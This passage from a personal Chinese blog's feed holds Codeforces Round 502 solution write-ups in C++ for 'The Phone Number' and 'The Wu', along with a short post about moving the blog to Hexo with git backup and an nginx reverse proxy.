class="line">        &#123;</span><br><span class="line">            sum3++;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a[i]==<span class="literal">false</span>&amp;&amp;b[i]==<span class="literal">false</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum4++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ret=n;</span><br><span class="line">    ret=ret*(n<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line">    ret-=sum1*(sum1<span class="number">-1</span>)/<span class="number">2</span>+sum2*(sum2<span class="number">-1</span>)/<span class="number">2</span>+sum3*(sum3<span class="number">-1</span>)/<span class="number">2</span>+sum4*(sum4<span class="number">-1</span>)/<span class="number">2</span>+sum1*sum2+sum3*sum4+sum1*sum3; </span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ret&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="The-Phone-Number"><a href="#The-Phone-Number" class="headerlink" title="The Phone Number"></a>The Phone Number</h2><p>这道题基于这样一个结论,对于一个序列,如果$ LIS=L $,那么$ LDS=\lceil \frac{n}{L}\rceil $,啊,我也不知道这个结论从哪来的,可能出题人都是神仙吧(这个结论悄悄记下来),仔细想一下这个结论好像有点道理，如果从每一组$LIS$中取出一个可能的值，拼起来就是这个值。既然有这个结论，那么要求$min=LIS+LDS$ 最小显然就是$L+\lceil\frac{n}{L}\rceil$最小，根据均值不等式取相等，结果就是$L=\lfloor\sqrt(n)\rfloor $.于是就可以xjr构造了</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    i=<span class="built_in">sqrt</span>(n);</span><br><span class="line">    j=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=n/i;++j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">1</span>;r&lt;=i;++r)</span><br><span class="line">        &#123;</span><br><span class="line">            cnt++;</span><br><span class="line">            <span class="keyword">int</span> ret=n-j*i+r;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,ret);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n-cnt;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="The-Wu"><a href="#The-Wu" class="headerlink" title="The Wu"></a>The Wu</h2><p>The wu这个名字看了一眼尽然让我的键盘自动打出了skr!这个题很可惜，赛中想出了大概思路，即不要到最后进行一一处理，考虑$n$长度的01串可以用$2^n$个整数来一一对应，于是最多进行$4096$种情况处理就行。我一开始想的是先把字符串读进来，然后枚举$i$从$0$到$(2^n)-1$,表示询问01串$i$的情况，然后对$m$个读入的字符串做处理存到$sum$中，最后做个前缀和。啊，自己太傻逼了，已经离正解很近了。。<br>参考别人的ac代码之后进行改进，首先既然只有最多$4096$种询问串的情况，那么显然没必要去一一枚举$m$啊！sb啊$m$比$2^{maxn}$大这么多，肯定有很多重复，于是枚举$m$变成了$2^n$数量级下降了$10^2$，算了一下这个时候我就能过掉了，但是还能做一些改进。。因为只有$2^n$种情况，就没必要每次都一一比对算出Wu Number，只需要写事先维护$fun(x)$表示情况$x$下的Wu Number，$x=a\oplus b$ 利用了异或两者相同为0不同为1的特性。也可以用&amp;，反正只需要做预处理就行。这样复杂度又㕛叒叕降低了，这个题对时限卡的很严，稍微优化不到位都会t，其实仔细想来各种优化思路都很显然，啊我可真是个鶸。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxk=<span class="number">101</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxm=<span class="number">5e5</span>+<span class="number">3</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">12</span>+<span class="number">1</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxl=(<span class="number">1</span>&lt;&lt;<span class="number">12</span>)+<span class="number">1</span>;</span><br><span class="line"><span class="comment">//char dt[maxm][maxn];</span></span><br><span class="line"><span class="keyword">char</span> temp[maxn];</span><br><span class="line"><span class="keyword">int</span> w[maxn];</span><br><span class="line"><span class="keyword">int</span> dt[maxl];</span><br><span class="line"><span class="keyword">int</span> ret[maxl][maxk];</span><br><span class="line"><span class="comment">//map&lt;string,int&gt;mpt;</span></span><br><span class="line"><span class="keyword">int</span> f[maxl];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">b2i</span><span class="params">(<span class="keyword">char</span> *a,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">   &#123;</span><br><span class="line">       ret=ret&lt;&lt;<span class="number">1</span>;</span><br><span class="line">       <span class="keyword">if</span>(a[i]==<span class="string">'1'</span>)</span><br><span class="line">       &#123;</span><br><span class="line">           ret=ret|<span class="number">1</span>;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m,q;</span><br><span class="line">    <span class="comment">//memset(ret,0,sizeof(ret));</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d%d"</span>,&amp;n,&amp;m,&amp;q);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;w[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;temp);</span><br><span class="line">        dt[b2i(temp,n)]++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//init f</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;n);++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> k=i;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">0</span>;r&lt;n;++r)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(!((k&gt;&gt;r)&amp;<span class="number">1</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                f[i]+=w[n-r];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//temp[n-r-1]=((i&gt;&gt;r)&amp;1)+'0';</span></span><br><span class="line">        &#125;</span><br><span class="line">        temp[n]=<span class="string">'\0'</span>;</span><br><span class="line">       <span class="comment">// mpt[string(temp)]=i;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//init sum</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;n);++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> r=<span class="number">0</span>;r&lt;(<span class="number">1</span>&lt;&lt;n);++r)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> sum=f[r^i];</span><br><span class="line">            <span class="keyword">if</span>(sum&gt;=maxk)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                ret[i][sum]+=dt[r];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> qk;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;(<span class="number">1</span>&lt;&lt;n);++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=<span class="number">100</span>;++j)</span><br><span class="line">        &#123;</span><br><span class="line">            ret[i][j]+=ret[i][j<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=q;++i)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,temp);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;qk);</span><br><span class="line">        <span class="keyword">int</span> qt=b2i(&amp;temp[<span class="number">0</span>],n);</span><br><span class="line">        <span class="keyword">int</span> retsum=ret[qt][qk];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,retsum);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>顺便吐槽今天的度度熊摧毁服务器比赛，一度让我怀疑自己的码力不足。手撸双向链表最后才过，结果list直接暴力就能a，血亏。现在博客github备份一次,本地md文件备份一次，我就不信还能继续丢数据,mmp。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Codeforces-Round-502&quot;&gt;&lt;a href=&quot;#Codeforces-Round-502&quot; class=&quot;headerlink&quot; title=&quot;Codeforces Round #502&quot;&gt;&lt;/a&gt;Codeforces Round #502&lt;/h1
      
    
    </summary>
    
      <category term="Codeforces" scheme="lengyu.me/categories/Codeforces/"/>
    
    
      <category term="算法" scheme="lengyu.me/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="Codeforces" scheme="lengyu.me/tags/Codeforces/"/>
    
  </entry>
  
  <entry>
    <title>Hello World!</title>
    <link href="lengyu.me/2018/08/11/hello-world/"/>
    <id>lengyu.me/2018/08/11/hello-world/</id>
    <published>2018-08-10T21:41:52.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<p>啊，我的博客又㕛叒叕回来了(奇怪，为啥会这么说)，经历过两次丢失博客数据的经历后，决定抛弃Typecho，换用Hexo。因为看到蔡队的blog，感觉还不错，而且Hexo是一个静态blog，稍作配置之后还支持git备份，对我这种经常丢数据的人来说简直不能再合适了。博客搭建主要参考了<a href="https://www.cnblogs.com/visugar/p/6821777.html" target="_blank" rel="noopener">从0开始搭建Hexo博客</a>，但这个教程存在一个问题，git配置处不应该填写https链接而应该填写ssh，否则每次都会让你输入账号密码。接着使用了hexo的admin插件，安装了next主题，配置了$\LaTeX$支持,大体上就是这样了。因为我的vps是centos，采用的nginx服务器，于是我将博客子域名配置到了public目录下，这样访问我的博客就只能看到静态文件生成的页面，而避免了直接使用hexo的调试服务。但admin配置又需要使用hexo自带的调试服务器，于是又另外进行了一个反向代理，配置到了另一个子域名下，这保证了即使hexo自带服务挂掉，也不会对blog产生影响。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;啊，我的博客又㕛叒叕回来了(奇怪，为啥会这么说)，经历过两次丢失博客数据的经历后，决定抛弃Typecho，换用Hexo。因为看到蔡队的blog，感觉还不错，而且Hexo是一个静态blog，稍作配置之后还支持git备份，对我这种经常丢数据的人来说简直不能再合适了。博客搭建主要
      
    
    </summary>
    
    
      <category term="闲谈" scheme="lengyu.me/tags/%E9%97%B2%E8%B0%88/"/>
    
  </entry>
  
</feed>
